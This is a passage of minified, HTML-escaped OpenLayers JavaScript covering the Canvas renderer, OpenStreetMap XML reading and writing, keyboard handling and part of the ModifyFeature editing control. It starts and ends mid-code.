b},CLASS_NAME:"OpenLayers.Renderer"});OpenLayers.Renderer.defaultSymbolizer={fillColor:"#000000",strokeColor:"#000000",strokeWidth:2,fillOpacity:1,strokeOpacity:1,pointRadius:0,labelAlign:"cm"}; OpenLayers.Renderer.symbol={star:[350,75,379,161,469,161,397,215,423,301,350,250,277,301,303,215,231,161,321,161,350,75],cross:[4,0,6,0,6,4,10,4,10,6,6,6,6,10,4,10,4,6,0,6,0,4,4,4,4,0],x:[0,0,25,0,50,35,75,0,100,0,65,50,100,100,75,100,50,65,25,100,0,100,35,50,0,0],square:[0,0,0,1,1,1,1,0,0,0],triangle:[0,10,10,10,5,0,0,10]};OpenLayers.Renderer.Canvas=OpenLayers.Class(OpenLayers.Renderer,{hitDetection:!0,hitOverflow:0,canvas:null,features:null,pendingRedraw:!1,cachedSymbolBounds:{},initialize:function(a,b){OpenLayers.Renderer.prototype.initialize.apply(this,arguments);this.root=document.createElement("canvas");this.container.appendChild(this.root);this.canvas=this.root.getContext("2d");this.features={};this.hitDetection&amp;&amp;(this.hitCanvas=document.createElement("canvas"),this.hitContext=this.hitCanvas.getContext("2d"))}, setExtent:function(){OpenLayers.Renderer.prototype.setExtent.apply(this,arguments);return!1},eraseGeometry:function(a,b){this.eraseFeatures(this.features[b][0])},supported:function(){return OpenLayers.CANVAS_SUPPORTED},setSize:function(a){this.size=a.clone();var b=this.root;b.style.width=a.w+"px";b.style.height=a.h+"px";b.width=a.w;b.height=a.h;this.resolution=null;this.hitDetection&amp;&amp;(b=this.hitCanvas,b.style.width=a.w+"px",b.style.height=a.h+"px",b.width=a.w,b.height=a.h)},drawFeature:function(a, b){var c;if(a.geometry){b=this.applyDefaultSymbolizer(b||a.style);c=a.geometry.getBounds();var d;this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine&amp;&amp;(d=this.map.getMaxExtent());d=c&amp;&amp;c.intersectsBounds(this.extent,{worldBounds:d});(c="none"!==b.display&amp;&amp;!!c&amp;&amp;d)?this.features[a.id]=[a,b]:delete this.features[a.id];this.pendingRedraw=!0}this.pendingRedraw&amp;&amp;!this.locked&amp;&amp;(this.redraw(),this.pendingRedraw=!1);return c},drawGeometry:function(a,b,c){var d=a.CLASS_NAME;if("OpenLayers.Geometry.Collection"== d||"OpenLayers.Geometry.MultiPoint"==d||"OpenLayers.Geometry.MultiLineString"==d||"OpenLayers.Geometry.MultiPolygon"==d)for(d=0;d&lt;a.components.length;d++)this.drawGeometry(a.components[d],b,c);else switch(a.CLASS_NAME){case "OpenLayers.Geometry.Point":this.drawPoint(a,b,c);break;case "OpenLayers.Geometry.LineString":this.drawLineString(a,b,c);break;case "OpenLayers.Geometry.LinearRing":this.drawLinearRing(a,b,c);break;case "OpenLayers.Geometry.Polygon":this.drawPolygon(a,b,c)}},drawExternalGraphic:function(a, b,c){var d=new Image,e=b.title||b.graphicTitle;e&amp;&amp;(d.title=e);var f=b.graphicWidth||b.graphicHeight,g=b.graphicHeight||b.graphicWidth,f=f?f:2*b.pointRadius,g=g?g:2*b.pointRadius,h=void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*f),k=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*g),l=b.graphicOpacity||b.fillOpacity;d.onload=OpenLayers.Function.bind(function(){if(this.features[c]){var b=this.getLocalXY(a),e=b[0],b=b[1];if(!isNaN(e)&amp;&amp;!isNaN(b)){var e=e+h|0,b=b+k|0,p=this.canvas;p.globalAlpha=l;var q= OpenLayers.Renderer.Canvas.drawImageScaleFactor||(OpenLayers.Renderer.Canvas.drawImageScaleFactor=/android 2.1/.test(navigator.userAgent.toLowerCase())?320/window.screen.width:1);p.drawImage(d,e*q,b*q,f*q,g*q);this.hitDetection&amp;&amp;(this.setHitContextStyle("fill",c),this.hitContext.fillRect(e,b,f,g))}}},this);d.src=b.externalGraphic},drawNamedSymbol:function(a,b,c){var d,e,f,g;f=Math.PI/180;var h=OpenLayers.Renderer.symbol[b.graphicName];if(!h)throw Error(b.graphicName+" is not a valid symbol name"); if(!(!h.length||2>h.length||(a=this.getLocalXY(a),e=a[0],g=a[1],isNaN(e)||isNaN(g)))){this.canvas.lineCap="round";this.canvas.lineJoin="round";this.hitDetection&amp;&amp;(this.hitContext.lineCap="round",this.hitContext.lineJoin="round");if(b.graphicName in this.cachedSymbolBounds)d=this.cachedSymbolBounds[b.graphicName];else{d=new OpenLayers.Bounds;for(a=0;a&lt;h.length;a+=2)d.extend(new OpenLayers.LonLat(h[a],h[a+1]));this.cachedSymbolBounds[b.graphicName]=d}this.canvas.save();this.hitDetection&amp;&amp;this.hitContext.save(); this.canvas.translate(e,g);this.hitDetection&amp;&amp;this.hitContext.translate(e,g);a=f*b.rotation;isNaN(a)||(this.canvas.rotate(a),this.hitDetection&amp;&amp;this.hitContext.rotate(a));f=2*b.pointRadius/Math.max(d.getWidth(),d.getHeight());this.canvas.scale(f,f);this.hitDetection&amp;&amp;this.hitContext.scale(f,f);a=d.getCenterLonLat().lon;d=d.getCenterLonLat().lat;this.canvas.translate(-a,-d);this.hitDetection&amp;&amp;this.hitContext.translate(-a,-d);g=b.strokeWidth;b.strokeWidth=g/f;if(!1!==b.fill){this.setCanvasStyle("fill", b);this.canvas.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.canvas.moveTo(d,e),this.canvas.lineTo(d,e);this.canvas.closePath();this.canvas.fill();if(this.hitDetection){this.setHitContextStyle("fill",c,b);this.hitContext.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.canvas.moveTo(d,e),this.hitContext.lineTo(d,e);this.hitContext.closePath();this.hitContext.fill()}}if(!1!==b.stroke){this.setCanvasStyle("stroke",b);this.canvas.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a], e=h[a+1],0==a&amp;&amp;this.canvas.moveTo(d,e),this.canvas.lineTo(d,e);this.canvas.closePath();this.canvas.stroke();if(this.hitDetection){this.setHitContextStyle("stroke",c,b,f);this.hitContext.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.hitContext.moveTo(d,e),this.hitContext.lineTo(d,e);this.hitContext.closePath();this.hitContext.stroke()}}b.strokeWidth=g;this.canvas.restore();this.hitDetection&amp;&amp;this.hitContext.restore();this.setCanvasStyle("reset")}},setCanvasStyle:function(a,b){"fill"=== a?(this.canvas.globalAlpha=b.fillOpacity,this.canvas.fillStyle=b.fillColor):"stroke"===a?(this.canvas.globalAlpha=b.strokeOpacity,this.canvas.strokeStyle=b.strokeColor,this.canvas.lineWidth=b.strokeWidth):(this.canvas.globalAlpha=0,this.canvas.lineWidth=1)},featureIdToHex:function(a){a=Number(a.split("_").pop())+1;16777216&lt;=a&amp;&amp;(this.hitOverflow=a-16777215,a=a%16777216+1);a="000000"+a.toString(16);var b=a.length;return a="#"+a.substring(b-6,b)},setHitContextStyle:function(a,b,c,d){b=this.featureIdToHex(b); "fill"==a?(this.hitContext.globalAlpha=1,this.hitContext.fillStyle=b):"stroke"==a?(this.hitContext.globalAlpha=1,this.hitContext.strokeStyle=b,"undefined"===typeof d?this.hitContext.lineWidth=c.strokeWidth+2:isNaN(d)||(this.hitContext.lineWidth=c.strokeWidth+2/d)):(this.hitContext.globalAlpha=0,this.hitContext.lineWidth=1)},drawPoint:function(a,b,c){if(!1!==b.graphic)if(b.externalGraphic)this.drawExternalGraphic(a,b,c);else if(b.graphicName&amp;&amp;"circle"!=b.graphicName)this.drawNamedSymbol(a,b,c);else{var d= this.getLocalXY(a);a=d[0];d=d[1];if(!isNaN(a)&amp;&amp;!isNaN(d)){var e=2*Math.PI,f=b.pointRadius;!1!==b.fill&amp;&amp;(this.setCanvasStyle("fill",b),this.canvas.beginPath(),this.canvas.arc(a,d,f,0,e,!0),this.canvas.fill(),this.hitDetection&amp;&amp;(this.setHitContextStyle("fill",c,b),this.hitContext.beginPath(),this.hitContext.arc(a,d,f,0,e,!0),this.hitContext.fill()));!1!==b.stroke&amp;&amp;(this.setCanvasStyle("stroke",b),this.canvas.beginPath(),this.canvas.arc(a,d,f,0,e,!0),this.canvas.stroke(),this.hitDetection&amp;&amp;(this.setHitContextStyle("stroke", c,b),this.hitContext.beginPath(),this.hitContext.arc(a,d,f,0,e,!0),this.hitContext.stroke()),this.setCanvasStyle("reset"))}}},drawLineString:function(a,b,c){b=OpenLayers.Util.applyDefaults({fill:!1},b);this.drawLinearRing(a,b,c)},drawLinearRing:function(a,b,c){!1!==b.fill&amp;&amp;(this.setCanvasStyle("fill",b),this.renderPath(this.canvas,a,b,c,"fill"),this.hitDetection&amp;&amp;(this.setHitContextStyle("fill",c,b),this.renderPath(this.hitContext,a,b,c,"fill")));!1!==b.stroke&amp;&amp;(this.setCanvasStyle("stroke",b),this.renderPath(this.canvas, a,b,c,"stroke"),this.hitDetection&amp;&amp;(this.setHitContextStyle("stroke",c,b),this.renderPath(this.hitContext,a,b,c,"stroke")));this.setCanvasStyle("reset")},renderPath:function(a,b,c,d,e){b=b.components;c=b.length;a.beginPath();d=this.getLocalXY(b[0]);var f=d[1];if(!isNaN(d[0])&amp;&amp;!isNaN(f)){a.moveTo(d[0],d[1]);for(d=1;d&lt;c;++d)f=this.getLocalXY(b[d]),a.lineTo(f[0],f[1]);"fill"===e?a.fill():a.stroke()}},drawPolygon:function(a,b,c){a=a.components;var d=a.length;this.drawLinearRing(a[0],b,c);for(var e=1;e&lt; d;++e)this.canvas.globalCompositeOperation="destination-out",this.hitDetection&amp;&amp;(this.hitContext.globalCompositeOperation="destination-out"),this.drawLinearRing(a[e],OpenLayers.Util.applyDefaults({stroke:!1,fillOpacity:1},b),c),this.canvas.globalCompositeOperation="source-over",this.hitDetection&amp;&amp;(this.hitContext.globalCompositeOperation="source-over"),this.drawLinearRing(a[e],OpenLayers.Util.applyDefaults({fill:!1},b),c)},drawText:function(a,b){var c=this.getLocalXY(a);this.setCanvasStyle("reset"); this.canvas.fillStyle=b.fontColor;this.canvas.globalAlpha=b.fontOpacity||1;var d=[b.fontStyle?b.fontStyle:"normal","normal",b.fontWeight?b.fontWeight:"normal",b.fontSize?b.fontSize:"1em",b.fontFamily?b.fontFamily:"sans-serif"].join(" "),e=b.label.split("\n"),f=e.length;if(this.canvas.fillText){this.canvas.font=d;this.canvas.textAlign=OpenLayers.Renderer.Canvas.LABEL_ALIGN[b.labelAlign[0]]||"center";this.canvas.textBaseline=OpenLayers.Renderer.Canvas.LABEL_ALIGN[b.labelAlign[1]]||"middle";var g=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[1]]; null==g&amp;&amp;(g=-0.5);d=this.canvas.measureText("Mg").height||this.canvas.measureText("xx").width;c[1]+=d*g*(f-1);for(g=0;g&lt;f;g++)b.labelOutlineWidth&amp;&amp;(this.canvas.save(),this.canvas.globalAlpha=b.labelOutlineOpacity||b.fontOpacity||1,this.canvas.strokeStyle=b.labelOutlineColor,this.canvas.lineWidth=b.labelOutlineWidth,this.canvas.strokeText(e[g],c[0],c[1]+d*g+1),this.canvas.restore()),this.canvas.fillText(e[g],c[0],c[1]+d*g)}else if(this.canvas.mozDrawText){this.canvas.mozTextStyle=d;var h=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[0]]; null==h&amp;&amp;(h=-0.5);g=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[1]];null==g&amp;&amp;(g=-0.5);d=this.canvas.mozMeasureText("xx");c[1]+=d*(1+g*f);for(g=0;g&lt;f;g++){var k=c[0]+h*this.canvas.mozMeasureText(e[g]),l=c[1]+g*d;this.canvas.translate(k,l);this.canvas.mozDrawText(e[g]);this.canvas.translate(-k,-l)}}this.setCanvasStyle("reset")},getLocalXY:function(a){var b=this.getResolution(),c=this.extent;return[(a.x-this.featureDx)/b+-c.left/b,c.top/b-a.y/b]},clear:function(){var a=this.root.height,b=this.root.width; this.canvas.clearRect(0,0,b,a);this.features={};this.hitDetection&amp;&amp;this.hitContext.clearRect(0,0,b,a)},getFeatureIdFromEvent:function(a){var b;if(this.hitDetection&amp;&amp;"none"!==this.root.style.display&amp;&amp;!this.map.dragging&amp;&amp;(a=a.xy,a=this.hitContext.getImageData(a.x|0,a.y|0,1,1).data,255===a[3]&amp;&amp;(a=a[2]+256*(a[1]+256*a[0])))){a="OpenLayers_Feature_Vector_"+(a-1+this.hitOverflow);try{b=this.features[a][0]}catch(c){}}return b},eraseFeatures:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0;b&lt;a.length;++b)delete this.features[a[b].id]; this.redraw()},redraw:function(){if(!this.locked){var a=this.root.height,b=this.root.width;this.canvas.clearRect(0,0,b,a);this.hitDetection&amp;&amp;this.hitContext.clearRect(0,0,b,a);var a=[],c,d,e=this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine&amp;&amp;this.map.getMaxExtent(),f;for(f in this.features)this.features.hasOwnProperty(f)&amp;&amp;(b=this.features[f][0],c=b.geometry,this.calculateFeatureDx(c.getBounds(),e),d=this.features[f][1],this.drawGeometry(c,d,b.id),d.label&amp;&amp;a.push([b,d]));b=0;for(c=a.length;b&lt;c;++b)f= a[b],this.drawText(f[0].geometry.getCentroid(),f[1])}},CLASS_NAME:"OpenLayers.Renderer.Canvas"});OpenLayers.Renderer.Canvas.LABEL_ALIGN={l:"left",r:"right",t:"top",b:"bottom"};OpenLayers.Renderer.Canvas.LABEL_FACTOR={l:0,r:-1,t:0,b:-1};OpenLayers.Renderer.Canvas.drawImageScaleFactor=null;OpenLayers.Format.OSM=OpenLayers.Class(OpenLayers.Format.XML,{checkTags:!1,interestingTagsExclude:null,areaTags:null,initialize:function(a){var b={interestingTagsExclude:"source source_ref source:ref history attribution created_by".split(" "),areaTags:"area building leisure tourism ruins historic landuse military natural sport".split(" ")},b=OpenLayers.Util.extend(b,a),c={};for(a=0;a&lt;b.interestingTagsExclude.length;a++)c[b.interestingTagsExclude[a]]=!0;b.interestingTagsExclude=c;c={};for(a=0;a&lt;b.areaTags.length;a++)c[b.areaTags[a]]= !0;b.areaTags=c;this.externalProjection=new OpenLayers.Projection("EPSG:4326");OpenLayers.Format.XML.prototype.initialize.apply(this,[b])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=this.getNodes(a),c=this.getWays(a);a=Array(c.length);for(var d=0;d&lt;c.length;d++){for(var e=Array(c[d].nodes.length),f=this.isWayArea(c[d])?1:0,g=0;g&lt;c[d].nodes.length;g++){var h=b[c[d].nodes[g]],k=new OpenLayers.Geometry.Point(h.lon,h.lat);k.osm_id=parseInt(c[d].nodes[g]); e[g]=k;h.used=!0}h=null;h=f?new OpenLayers.Geometry.Polygon(new OpenLayers.Geometry.LinearRing(e)):new OpenLayers.Geometry.LineString(e);this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;h.transform(this.externalProjection,this.internalProjection);e=new OpenLayers.Feature.Vector(h,c[d].tags);e.osm_id=parseInt(c[d].id);e.fid="way."+e.osm_id;a[d]=e}for(var l in b){h=b[l];if(!h.used||this.checkTags){c=null;if(this.checkTags){c=this.getTags(h.node,!0);if(h.used&amp;&amp;!c[1])continue;c=c[0]}else c=this.getTags(h.node); e=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(h.lon,h.lat),c);this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;e.geometry.transform(this.externalProjection,this.internalProjection);e.osm_id=parseInt(l);e.fid="node."+e.osm_id;a.push(e)}h.node=null}return a},getNodes:function(a){a=a.getElementsByTagName("node");for(var b={},c=0;c&lt;a.length;c++){var d=a[c],e=d.getAttribute("id");b[e]={lat:d.getAttribute("lat"),lon:d.getAttribute("lon"),node:d}}return b},getWays:function(a){a=a.getElementsByTagName("way"); for(var b=[],c=0;c&lt;a.length;c++){var d=a[c],e={id:d.getAttribute("id")};e.tags=this.getTags(d);d=d.getElementsByTagName("nd");e.nodes=Array(d.length);for(var f=0;f&lt;d.length;f++)e.nodes[f]=d[f].getAttribute("ref");b.push(e)}return b},getTags:function(a,b){for(var c=a.getElementsByTagName("tag"),d={},e=!1,f=0;f&lt;c.length;f++){var g=c[f].getAttribute("k");d[g]=c[f].getAttribute("v");b&amp;&amp;(this.interestingTagsExclude[g]||(e=!0))}return b?[d,e]:d},isWayArea:function(a){var b=!1,c=!1;a.nodes[0]==a.nodes[a.nodes.length- 1]&amp;&amp;(b=!0);if(this.checkTags)for(var d in a.tags)if(this.areaTags[d]){c=!0;break}return b&amp;&amp;(this.checkTags?c:!0)},write:function(a){OpenLayers.Util.isArray(a)||(a=[a]);this.osm_id=1;this.created_nodes={};var b=this.createElementNS(null,"osm");b.setAttribute("version","0.5");b.setAttribute("generator","OpenLayers "+OpenLayers.VERSION_NUMBER);for(var c=a.length-1;0&lt;=c;c--)for(var d=this.createFeatureNodes(a[c]),e=0;e&lt;d.length;e++)b.appendChild(d[e]);return OpenLayers.Format.XML.prototype.write.apply(this, [b])},createFeatureNodes:function(a){var b=[],c=a.geometry.CLASS_NAME,c=c.substring(c.lastIndexOf(".")+1),c=c.toLowerCase();(c=this.createXML[c])&amp;&amp;(b=c.apply(this,[a]));return b},createXML:{point:function(a){var b=null,c=a.geometry?a.geometry:a;this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(c=c.clone(),c.transform(this.internalProjection,this.externalProjection));var d=!1;a.osm_id?(b=a.osm_id,this.created_nodes[b]&amp;&amp;(d=!0)):(b=-this.osm_id,this.osm_id++);var e=d?this.created_nodes[b]:this.createElementNS(null, "node");this.created_nodes[b]=e;e.setAttribute("id",b);e.setAttribute("lon",c.x);e.setAttribute("lat",c.y);a.attributes&amp;&amp;this.serializeTags(a,e);this.setState(a,e);return d?[]:[e]},linestring:function(a){var b,c=[],d=a.geometry;a.osm_id?b=a.osm_id:(b=-this.osm_id,this.osm_id++);var e=this.createElementNS(null,"way");e.setAttribute("id",b);for(b=0;b&lt;d.components.length;b++){var f=this.createXML.point.apply(this,[d.components[b]]);if(f.length){var f=f[0],g=f.getAttribute("id");c.push(f)}else g=d.components[b].osm_id, f=this.created_nodes[g];this.setState(a,f);f=this.createElementNS(null,"nd");f.setAttribute("ref",g);e.appendChild(f)}this.serializeTags(a,e);c.push(e);return c},polygon:function(a){var b=OpenLayers.Util.extend({area:"yes"},a.attributes),b=new OpenLayers.Feature.Vector(a.geometry.components[0],b);b.osm_id=a.osm_id;return this.createXML.linestring.apply(this,[b])}},serializeTags:function(a,b){for(var c in a.attributes){var d=this.createElementNS(null,"tag");d.setAttribute("k",c);d.setAttribute("v", a.attributes[c]);b.appendChild(d)}},setState:function(a,b){if(a.state){var c=null;switch(a.state){case OpenLayers.State.UPDATE:case OpenLayers.State.DELETE:c="delete"}c&amp;&amp;b.setAttribute("action",c)}},CLASS_NAME:"OpenLayers.Format.OSM"});OpenLayers.Handler.Keyboard=OpenLayers.Class(OpenLayers.Handler,{KEY_EVENTS:["keydown","keyup"],eventListener:null,observeElement:null,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.eventListener=OpenLayers.Function.bindAsEventListener(this.handleKeyEvent,this)},destroy:function(){this.deactivate();this.eventListener=null;OpenLayers.Handler.prototype.destroy.apply(this,arguments)},activate:function(){if(OpenLayers.Handler.prototype.activate.apply(this, arguments)){this.observeElement=this.observeElement||document;for(var a=0,b=this.KEY_EVENTS.length;a&lt;b;a++)OpenLayers.Event.observe(this.observeElement,this.KEY_EVENTS[a],this.eventListener);return!0}return!1},deactivate:function(){var a=!1;if(OpenLayers.Handler.prototype.deactivate.apply(this,arguments)){for(var a=0,b=this.KEY_EVENTS.length;a&lt;b;a++)OpenLayers.Event.stopObserving(this.observeElement,this.KEY_EVENTS[a],this.eventListener);a=!0}return a},handleKeyEvent:function(a){this.checkModifiers(a)&amp;&amp; this.callback(a.type,[a])},CLASS_NAME:"OpenLayers.Handler.Keyboard"});OpenLayers.Control.ModifyFeature=OpenLayers.Class(OpenLayers.Control,{documentDrag:!1,geometryTypes:null,clickout:!0,toggle:!0,standalone:!1,layer:null,feature:null,vertex:null,vertices:null,virtualVertices:null,handlers:null,deleteCodes:null,virtualStyle:null,vertexRenderIntent:null,mode:null,createVertices:!0,modified:!1,radiusHandle:null,dragHandle:null,onModificationStart:function(){},onModification:function(){},onModificationEnd:function(){},initialize:function(a,b){b=b||{};this.layer=a;this.vertices= [];this.virtualVertices=[];this.virtualStyle=OpenLayers.Util.extend({},this.layer.style||this.layer.styleMap.createSymbolizer(null,b.vertexRenderIntent));this.virtualStyle.fillOpacity=0.3;this.virtualStyle.strokeOpacity=0.3;this.deleteCodes=[46,68];this.mode=OpenLayers.Control.ModifyFeature.RESHAPE;OpenLayers.Control.prototype.initialize.apply(this,[b]);OpenLayers.Util.isArray(this.deleteCodes)||(this.deleteCodes=[this.deleteCodes]);var c={documentDrag:this.documentDrag,stopDown:!1};this.handlers= {keyboard:new OpenLayers.Handler.Keyboard(this,{keydown:this.handleKeypress}),drag:new OpenLayers.Handler.Drag(this,{down:function(a){this.vertex=null;(a=this.layer.getFeatureFromEvent(this.handlers.drag.evt))?this.dragStart(a):this.clickout&amp;&amp;(this._unselect=this.feature)},move:function(a){delete this._unselect;this.vertex&amp;&amp;this.dragVertex(this.vertex,a)},up:function(){this.handlers.drag.stopDown=!1;this._unselect&amp;&amp;(this.unselectFeature(this._unselect),delete this._unselect)},done:function(a){this.vertex&amp;&amp; this.dragComplete(this.vertex)}},c)}},destroy:function(){this.map&amp;&amp;this.map.events.un({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this});this.layer=null;OpenLayers.Control.prototype.destroy.apply(this,[])},activate:function(){this.moveLayerToTop();this.map.events.on({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this});return this.handlers.keyboard.activate()&amp;&amp;this.handlers.drag.activate()&amp;&amp;OpenLayers.Control.prototype.activate.apply(this,arguments)}, deactivate:function(){var a=!1;OpenLayers.Control.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.moveLayerBack(),this.map.events.un({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this}),this.layer.removeFeatures(this.vertices,{silent:!0}),this.layer.removeFeatures(this.virtualVertices,{silent:!0}),this.vertices=[],this.handlers.drag.deactivate(),this.handlers.keyboard.deactivate(),(a=this.feature)&amp;&amp;(a.geometry&amp;&amp;a.layer)&amp;&amp;this.unselectFeature(a),a=!0);return a},beforeSelectFeature:function(a){return this.layer.events.triggerEvent("beforefeaturemodified", {feature:a})},selectFeature:function(a){if(!(this.feature===a||this.geometryTypes&amp;&amp;-1==OpenLayers.Util.indexOf(this.geometryTypes,a.geometry.CLASS_NAME))){!1!==this.beforeSelectFeature(a)&amp;&amp;(this.feature&amp;&amp;this.unselectFeature(this.feature),this.feature=a,this.layer.selectedFeatures.push(a),this.layer.drawFeature(a,"select"),this.modified=!1,this.resetVertices(),this.onModificationStart(this.feature));var b=a.modified;!a.geometry||b&amp;&amp;b.geometry||(this._originalGeometry=a.geometry.clone())}},unselectFeature:function(a){this.layer.removeFeatures(this.vertices, {silent:!0});this.vertices=[];this.layer.destroyFeatures(this.virtualVertices,{silent:!0});this.virtualVertices=[];this.dragHandle&amp;&amp;(this.layer.destroyFeatures([this.dragHandle],{silent:!0}),delete this.dragHandle);this.radiusHandle&amp;&amp;(this.layer.destroyFeatures([this.radiusHandle],{silent:!0}),delete this.radiusHandle);this.layer.drawFeature(this.feature,"default");this.feature=null;OpenLayers.Util.removeItem(this.layer.selectedFeatures,a);this.onModificationEnd(a);this.layer.events.triggerEvent("afterfeaturemodified", {feature:a,modified:this.modified});this.modified=!1},dragStart:function(a){var b="OpenLayers.Geometry.Point"==a.geometry.CLASS_NAME;this.standalone||(a._sketch||!b)&amp;&amp;a._sketch||(this.toggle&amp;&amp;this.feature===a&amp;&amp;(this._unselect=a),this.selectFeature(a));if(a._sketch||b)this.vertex=a,this.handlers.drag.stopDown=!0},dragVertex:function(a,b){var c=this.map.getLonLatFromViewPortPx(b),d=a.geometry;d.move(c.lon-d.x,c.lat-d.y);this.modified=!0;"OpenLayers.Geometry.Point"==this.feature.geometry.CLASS_NAME? this.layer.events.triggerEvent("vertexmodified",{vertex:a.geometry,feature:this.feature,pixel:b}):(a._index?(a.geometry.parent.addComponent(a.geometry,a._index),delete a._index,OpenLayers.Util.removeItem(this.virtualVertices,a),this.vertices.push(a)):a==this.dragHandle?(this.layer.removeFeatures(this.vertices,{silent:!0}),this.vertices=[],this.radiusHandle&amp;&amp;(this.layer.destroyFeatures([this.radiusHandle],{silent:!0}),this.radiusHandle=null)):a!==this.radiusHandle&amp;&amp;this.layer.events.triggerEvent("vertexmodified", {vertex:a.geometry,feature:this.feature,pixel:b}),0&lt;this.virtualVertices.length&amp;&amp;(this.layer.destroyFeatures(this.virtualVertices,{silent:!0}),this.virtualVertices=[]),this.layer.drawFeature(this.feature,this.standalone?void 0:"select"));this.layer.drawFeature(a)},dragComplete:function(a){this.resetVertices();this.setFeatureState();this.onModification(this.feature);this.layer.events.triggerEvent("featuremodified",{feature:this.feature})},setFeatureState:function(){if(this.feature.state!=OpenLayers.State.INSERT&amp;&amp; this.feature.state!=OpenLayers.State.DELETE&amp;&amp;(this.feature.state=OpenLayers.State.UPDATE,this.modified&amp;&amp;this._originalGeometry)){var a=this.feature;a.modified=OpenLayers.Util.extend(a.modified,{geometry:this._originalGeometry});delete this._originalGeometry}},resetVertices:function(){0&lt;this.vertices.length&amp;&amp;(this.layer.removeFeatures(this.vertices,{silent:!0}),this.vertices=[]);0&lt;this.virtualVertices.length&amp;&amp;(this.layer.removeFeatures(this.virtualVertices,{silent:!0}),this.virtualVertices=[]);this.dragHandle&amp;&amp; (this.layer.destroyFeatures([this.dragHandle],{silent:!0}),this.dragHandle=null);this.radiusHandle&amp;&amp;(this.layer.destroyFeatures([this.radiusHandle],{silent:!0}),this.radiusHandle=null);this.feature&amp;&amp;"OpenLayers.Geometry.Point"!=this.feature.geometry.CLASS_NAME&amp;&amp;(this.mode&amp;OpenLayers.Control.ModifyFeature.DRAG&amp;&amp;this.collectDragHandle(),this.mode&amp;(OpenLayers.Control.ModifyFeature.ROTATE|OpenLayers.Control.ModifyFeature.RESIZE)&amp;&amp;this.collectRadiusHandle(),this.mode&amp;OpenLayers.Control.ModifyFeature.RESHAPE&amp;&amp; (this.mode&amp;OpenLayers.Control.ModifyFeature.RESIZE||this.collectVertices()))},handleKeypress:function(a){var b=a.keyCode;this.feature&amp;&amp;-1!=OpenLayers.Util.indexOf(this.deleteCodes,b)&amp;&amp;(b=this.layer.getFeatureFromEvent(this.handlers.drag.evt))&amp;&amp;(-1!=OpenLayers.Util.indexOf(this.vertices,b)&amp;&amp;!this.handlers.drag.dragging&amp;&amp;b.geometry.parent)&amp;&amp;(b.geometry.parent.removeComponent(b.geometry),this.layer.events.triggerEvent("vertexremoved",{vertex:b.geometry,feature:this.feature,pixel:a.xy}),this.layer.drawFeature(this.feature, this.standalone?void 0:"select"),this.modified=!0,this.resetVertices(),this.setFeatureState(),this.onModification(this.feature),this.layer.events.triggerEvent("featuremodified",{feature:this.feature}))},collectVertices:function(){function a(c){var d,e,f;if("OpenLayers.Geometry.Point"==c.CLASS_NAME)e=new OpenLayers.Feature.Vector(c),e._sketch=!0,e.renderIntent=b.vertexRenderIntent,b.vertices.push(e);else{f=c.components.length;"OpenLayers.Geometry.LinearRing"==c.CLASS_NAME&amp;&amp;(f-=1);for(d=0;d&lt;f;++d)e= c.components[d],"OpenLayers.Geometry.Point"==e.CLASS_NAME?(e=new OpenLayers.Feature.Vector(e),e._sketch=!0,e.renderIntent=b.vertexRenderIntent,b.vertices.push(e)):a(e);if(b.createVertices&amp;&amp;"OpenLayers.Geometry.MultiPoint"!=c.CLASS_NAME)for(d=0,f=c.components.length;d&lt;f-1;++d){e=c.components[d];var g=c.components[d+1];"OpenLayers.Geometry.Point"==e.CLASS_NAME&amp;&amp;"OpenLayers.Geometry.Point"==g.CLASS_NAME&amp;&amp;(e=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point((e.x+g.x)/2,(e.y+g.y)/2),null,b.virtualStyle), e.geometry.parent=c,e._index=d+1,e._sketch=!0,b.virtualVertices.push(e))}}}this.vertices=[];this.virtualVertices=[];var b=this;a.call(this,this.feature.geometry);this.layer.addFeatures(this.virtualVertices,{silent:!0});this.layer.addFeatures(this.vertices,{silent:!0})},collectDragHandle:function(){var a=this.feature.geometry,b=a.getBounds().getCenterLonLat(),b=new OpenLayers.Geometry.Point(b.lon,b.lat),c=new OpenLayers.Feature.Vector(b);b.move=function(b,c){OpenLayers.Geometry.Point.prototype.move.call(this, b,c);a.move(b,c)};c._sketch=!0;this.dragHandle=c;this.dragHandle.renderIntent=this.vertexRenderIntent;this.layer.addFeatures([this.dragHandle],{silent:!0})},collectRadiusHandle:function(){var a=this.feature.geometry,b=a.getBounds(),c=b.getCenterLonLat(),d=new OpenLayers.Geometry.Point(c.lon,c.lat),b=new OpenLayers.Geometry.Point(b.right,b.bottom),c=new OpenLayers.Feature.Vector(b),e=this.mode&amp;OpenLayers.Control.ModifyFeature.RESIZE,f=this.mode&amp;OpenLayers.Control.ModifyFeature.RESHAPE,g=this.mode&amp; OpenLayers.Control.ModifyFeature.ROTATE;b.move=function(b,c){OpenLayers.Geometry.Point.prototype.move.call(this,b,c);var l=this.x-d.x,m=this.y-d.y,n=l-b,p=m-c;if(g){var q=Math.atan2(p,n),q=Math.atan2(m,l)-q,q=q*(180/Math.PI);a.rotate(q,d)}if(e){var 